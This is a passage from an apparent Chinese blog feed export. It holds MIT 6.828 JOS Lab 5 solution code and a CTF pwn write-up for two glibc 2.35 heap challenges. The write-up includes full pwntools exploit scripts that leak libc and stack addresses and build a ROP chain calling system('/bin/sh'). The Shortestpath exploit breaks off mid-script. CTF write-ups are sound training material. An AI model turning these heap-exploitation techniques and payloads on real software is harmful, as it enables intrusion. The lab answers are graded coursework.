class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">   <span class="type">int</span></span><br><span class="line">   <span class="title function_">serve_read</span><span class="params">(<span class="type">envid_t</span> envid, <span class="keyword">union</span> Fsipc *ipc)</span></span><br><span class="line">   {</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">Fsreq_read</span> *<span class="title">req</span> =</span> &amp;ipc-&gt;read;</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">Fsret_read</span> *<span class="title">ret</span> =</span> &amp;ipc-&gt;readRet;</span><br><span class="line">       <span class="keyword">if</span> (debug)</span><br><span class="line">           cprintf(<span class="string">"serve_read %08x %08x %08x\n"</span>, envid, req-&gt;req_fileid, req-&gt;req_n);</span><br><span class="line">       <span class="comment">// Lab 5: Your code here:</span></span><br><span class="line">       <span class="type">int</span> r;</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">OpenFile</span> *<span class="title">po</span>;</span></span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span> ((r = openfile_lookup(envid, req-&gt;req_fileid, &amp;po)) &lt; <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//防止溢出</span></span><br><span class="line"><span class="keyword">if</span>(req-&gt;req_n&gt;PGSIZE)</span><br><span class="line">req-&gt;req_n = PGSIZE;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> ((r = file_read(po-&gt;o_file, ret-&gt;ret_buf, req-&gt;req_n, po-&gt;o_fd-&gt;fd_offset)) &lt; <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line">       po-&gt;o_fd-&gt;fd_offset += r;</span><br><span class="line">       <span class="keyword">return</span> r;</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span></span><br><span class="line">   <span class="title function_">serve_write</span><span class="params">(<span class="type">envid_t</span> envid, <span class="keyword">struct</span> Fsreq_write *req)</span></span><br><span class="line">   {</span><br><span class="line">       <span class="keyword">if</span> (debug)</span><br><span class="line">           cprintf(<span class="string">"serve_write %08x %08x %08x\n"</span>, envid, req-&gt;req_fileid, req-&gt;req_n);</span><br><span class="line">       <span class="comment">// LAB 5: Your code here.</span></span><br><span class="line">       <span class="type">int</span> r;</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">OpenFile</span> *<span class="title">po</span>;</span></span><br><span class="line">       <span class="keyword">if</span> ((r = openfile_lookup(envid, req-&gt;req_fileid, &amp;po)) &lt; <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line">       <span class="keyword">if</span> ((r = file_write(po-&gt;o_file, req-&gt;req_buf, req-&gt;req_n, po-&gt;o_fd-&gt;fd_offset)) &lt; <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line">       po-&gt;o_fd-&gt;fd_offset += r;</span><br><span class="line">       <span class="keyword">return</span> r;</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">   <span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">   <span class="title function_">devfile_write</span><span class="params">(<span class="keyword">struct</span> Fd *fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> n)</span></span><br><span class="line">   {</span><br><span class="line">       <span class="comment">// Make an FSREQ_WRITE request to the file system server.  Be</span></span><br><span class="line">       <span class="comment">// careful: fsipcbuf.write.req_buf is only so large, but</span></span><br><span class="line">       <span class="comment">// remember that write is always allowed to write *fewer*</span></span><br><span class="line">       <span class="comment">// bytes than requested.</span></span><br><span class="line">       <span class="comment">// LAB 5: Your code here</span></span><br><span class="line">       <span class="keyword">if</span> (n &gt; <span class="keyword">sizeof</span>(fsipcbuf.write.req_buf))</span><br><span class="line">           panic(<span class="string">"devfile_write: invalid n\n"</span>);</span><br><span class="line">       fsipcbuf.write.req_fileid = fd-&gt;fd_file.id;</span><br><span class="line">       fsipcbuf.write.req_n = n;</span><br><span class="line">       memmove(fsipcbuf.write.req_buf, buf, n);</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">return</span> fsipc(FSREQ_WRITE, <span class="literal">NULL</span>);</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure><h3 id="Spawning-Processes"><a href="#Spawning-Processes" class="headerlink" title="Spawning Processes"></a>Spawning Processes</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_env_set_trapframe</span><span class="params">(<span class="type">envid_t</span> envid, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="comment">// Remember to check whether the user has supplied us with a good</span></span><br><span class="line"><span class="comment">// address!</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line">    <span class="keyword">if</span> ((r = envid2env(envid, &amp;e, <span class="number">1</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    user_mem_assert(curenv, (<span class="type">void</span> *)tf, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Trapframe), <span class="number">0</span>); </span><br><span class="line">    </span><br><span class="line">    memmove(&amp;e-&gt;env_tf, tf, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Trapframe));</span><br><span class="line">    e-&gt;env_tf.tf_cs |= <span class="number">3</span>;</span><br><span class="line">    e-&gt;env_tf.tf_eflags |= FL_IF;</span><br><span class="line">    e-&gt;env_tf.tf_eflags &amp;= ~FL_IOPL_MASK;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="Sharing-library-state-across-fork-and-spawn"><a href="#Sharing-library-state-across-fork-and-spawn" class="headerlink" title="Sharing library state across fork and spawn"></a>Sharing library state across fork and spawn</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copy the mappings for shared pages into the child address space.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">copy_shared_pages</span><span class="params">(<span class="type">envid_t</span> child)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">volatile</span> <span class="type">pde_t</span> uvpd[];</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">volatile</span> <span class="type">pte_t</span> uvpt[];</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">uintptr_t</span> va=<span class="number">0</span>;va&lt;UTOP;)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((uvpd[va &gt;&gt; PDXSHIFT]&amp;PTE_P)==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">va += PGSIZE*NPTENTRIES;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> perm = uvpt[va &gt;&gt; PTXSHIFT] &amp; PTE_SYSCALL;</span><br><span class="line">        <span class="keyword">if</span> ((perm &amp; PTE_P) == <span class="number">0</span>) {    <span class="comment">// Page not mapped.</span></span><br><span class="line">            va += PGSIZE;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (perm &amp; PTE_SHARE) {</span><br><span class="line">            <span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, (<span class="type">void</span> *)va, child, (<span class="type">void</span> *)va, perm)) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> r;</span><br><span class="line">        }</span><br><span class="line">        va += PGSIZE;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中华武数杯2023 WP</title>
      <link href="/2023/Shanghai-Master-WP/"/>
      <url>/2023/Shanghai-Master-WP/</url>
      
        <content type="html"><![CDATA[<p>最喜欢的高版本堆题,挺有意思的.<br><del>所以到底叫上海大师杯还是中华武数杯</del></p><h1 id="randomHeap"><a href="#randomHeap" class="headerlink" title="randomHeap"></a>randomHeap</h1><p>glibc2.35堆,保护全开</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310171525325.png"></p><p>程序实现了这样的堆管理结构.初始化时,分配了16个堆管理结构和16个大小为0x28字节的堆块,放入chunk_list和chunk_manager_list.正常情况下这两个结构应该是用户不可见的.</p><span id="more"></span><p>用户的对堆块的操作是通过user_chunk_manager_list,每次add会从chunk_manager_list取出一个堆管理结构的指针放到user_manager_list中,不涉及malloc的操作.</p><p>这三个list之间的id是随机产生的,没有对应关系.且堆块和堆管理结构的分配顺序也是随机的.</p><p>在show的时候没有对idx的判断,可以将IO_2_1_stdin_结构作为伪造的堆管理结构,泄露出libc地址.在edit的时候也没有对offset的判断.可以使offset为负数来修改某个堆块上方的堆管理结构,由于堆块和管理结构产生顺序随机,这里需要爆破一下,之后就可以完成任意地址读写.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310171526228.png"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">lg = <span class="keyword">lambda</span> x, y: log.success(<span class="string">f'<span class="subst">{x}</span>: <span class="subst">{<span class="built_in">hex</span>(y)}</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line">    p.init(io,e,libc)</span><br><span class="line">    show(-<span class="number">34</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">    io.recv(<span class="number">5</span>)</span><br><span class="line">    p.leak_libc(<span class="string">'libc_base'</span>,p.recvaddress(<span class="string">'bytes'</span>)-<span class="number">0x21ba80</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">        add(i,<span class="string">'b\n'</span>)</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(p.environ_addr))</span><br><span class="line">    stack = <span class="number">0</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">        show(i)</span><br><span class="line">        io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">        r = io.recv(<span class="number">8</span>,timeout=<span class="number">0.2</span>)</span><br><span class="line">        stack = u64(r)-<span class="number">0x120</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(stack).startswith(<span class="string">'0x7ff'</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            idx = i</span><br><span class="line">            lg(<span class="string">"stack"</span>,stack)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(stack))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.libc_rdi))</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">8</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.binsh_addr))</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">0x10</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.libc_ret))</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">0x18</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.system_addr))</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">if</span> p.recvflag():</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>init的时候分配了这样的大堆块,可以部分覆写chunk_manager的指针来指向这些大块,释放进largebin再泄露地址.</p><p>预期解爆破挺不容易的,要爆堆布局和爆一位ASLR.可以用扫描所有堆结构尝试泄露地址的方式来减少堆布局的爆破.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310172133067.png"></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">lg = <span class="keyword">lambda</span> x, y: log.success(<span class="string">f'<span class="subst">{x}</span>: <span class="subst">{<span class="built_in">hex</span>(y)}</span>'</span>)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive() <span class="keyword">if</span> io.connected() <span class="keyword">else</span> io.close()</span><br><span class="line">one_gadget = <span class="keyword">lambda</span> filename=LIBC: <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    remain = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">2</span>,<span class="number">15</span>))</span><br><span class="line">    io = process(binary)</span><br><span class="line">    p.init(io,e,libc)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        add(i,<span class="string">'b\n'</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,<span class="string">b'\x90\xa0\n'</span>)</span><br><span class="line">    heap = <span class="number">0</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">15</span>):</span><br><span class="line">        show(i)</span><br><span class="line">        io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">        r = io.recv(<span class="number">8</span>,timeout=<span class="number">0.2</span>)</span><br><span class="line">        heap = u64(r)-<span class="number">0x120</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(heap).startswith(<span class="string">'0x55'</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            idx = i</span><br><span class="line">            lg(<span class="string">"idx"</span>,idx)</span><br><span class="line">            <span class="comment"># pause()</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,<span class="string">b'\xa0\xa2\n'</span>)</span><br><span class="line">    delete(idx)</span><br><span class="line">    <span class="built_in">print</span>(idx)</span><br><span class="line">    <span class="built_in">print</span>(remain)</span><br><span class="line">    remain.remove(idx)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">16</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,<span class="string">b'\xa0\xa2\n'</span>)</span><br><span class="line">    heap = <span class="number">0</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> remain:</span><br><span class="line">        show(i)</span><br><span class="line">        io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">        r = io.recv(<span class="number">8</span>,timeout=<span class="number">0.2</span>)</span><br><span class="line">        addr = u64(r)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(addr).startswith(<span class="string">'0x7f'</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            idx = i</span><br><span class="line">            lg(<span class="string">"idx:"</span>,idx)</span><br><span class="line">            <span class="comment"># pause()</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    show(idx)</span><br><span class="line">    io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">    p.leak_libc(<span class="string">'libc_base'</span>,p.recvaddress(<span class="string">'bytes'</span>)-<span class="number">0x219ce0</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,p64(p.environ_addr))</span><br><span class="line">    io.recv()</span><br><span class="line">    show(idx)</span><br><span class="line">    io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">    stack = p.recvaddress(<span class="string">'bytes'</span>)-<span class="number">0x120</span></span><br><span class="line">    lg(<span class="string">"stack"</span>,stack)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,p64(stack))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.libc_base+<span class="number">0x2a745</span>))</span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">8</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.binsh_addr))</span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">0x18</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.system_addr))</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">if</span> p.recvflag():</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></tbody></table></figure><h1 id="Shortestpath"><a href="#Shortestpath" class="headerlink" title="Shortestpath"></a>Shortestpath</h1><p>2.35堆,保护全开</p><h2 id="逆向-1"><a href="#逆向-1" class="headerlink" title="逆向"></a>逆向</h2><p>是一个求图中两点间最短路径的程序,算法大概是从起点开始广搜然后比较所有能到达终点的路径长度(<del>一点算法不懂的表示很难逆</del>).</p><p>程序的图是用如下结构来表示的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192032023.png"></p><p>可以无限制的创建结点和边,输入函数有个offbynull,且可以绕开’\0’的截断,由此可以将tcache和unsortedbin中的堆拿出来,泄露堆和libc地址.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192035153.png"></p><p>现在就差任意写了,看看最短路径函数.<br>变量命名有点逆天,因为我是按照刚学的算法逆的,逆完发现就是个广搜.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192038807.png"></p><p>该函数使用如下的结构.算法首先创建了一个PathInfo的数组dist(存储路径信息)和一个S_set集合(记录一个结点是否已经以其为源点进行过广搜).<br>manager中的bottom_idx和top_idx,用作dist数组的索引.可以理解为双指针(形成的队列).<br>每搜到一个结点,<code>无论是否已经由其他点出发搜到过</code>,将该路径信息存到dist[top_idx]中.top_idx++.每以一个结点为源点开始搜索,将dist[bottom_idx]取出存到栈上的path,进行计算操作,bottom_idx++.这样top_idx和bottom_idx之间的PathInfo,就是已搜到但还未以其为源点搜索的结点(其实是路径信息).直到top_idx==bottom_idx,完成广搜.</p><p>不过有一个问题,dist数组只分配了node_count+1个PathInfo,而算法是每搜到一个结点,<code>无论是否已经由其他点出发搜到过</code>,将该路径信息存到dist数组中,所以存在溢出.构造一个图,其中一个结点有很多条入边,可以Poc出这个漏洞.</p><p>但我没有往这方面走,因为有另一个洞更吸引我注意.这个洞在逆向过程中很容易发现:<del>啊啊啊这两个__int64到底是啥啊也没初始化啊啊</del>.嗯哼,manager结构没有初始化.我们可以提前布置一个堆块伪造manager结构并释放,在short的时候取出,将其作为manager,由于tcache取出时对key的清0,bottom_idx的初始值一定为0.我们仅能控制top_idx.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192044234.png"></p><p>看看怎么利用.可以发现在进入循环之前的深搜初始化工作,将起点存到dist[top_idx]中,其中src_key是我们可控的,于是便有了dist+top_idx*0x18+8地址处的8字节任意写.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192111186.png"></p><p>别高兴太早,这样破坏内存的行为很容易导致程序崩溃.<br>橙色框中是容易导致崩溃的地方(还有内循环的store_dist函数).尝试通过黄色框中的条件绕过:第一个比较是无符号比较,无法通过负数绕过.第二个比较的cur_key不可控,无法绕过.gg<br>于是为了避免崩溃,我们的top_idx只能为一个较小数,只能完成在堆上的近似任意写(近似是因为有0x18倍数的要求).那就劫持tcache然后改stderr,再利用offbynull清空topchunk触发malloc_assert.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192115313.png"></p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>唉,最喜欢的调堆环节.<br>我知道exp里结点编号很乱…调完风水懒得改了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">p.init(io,e,libc)</span><br><span class="line"></span><br><span class="line">promt = <span class="string">":"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">option</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="built_in">str</span>(option))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">src,dst,size,content,val</span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(src))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(dst))</span><br><span 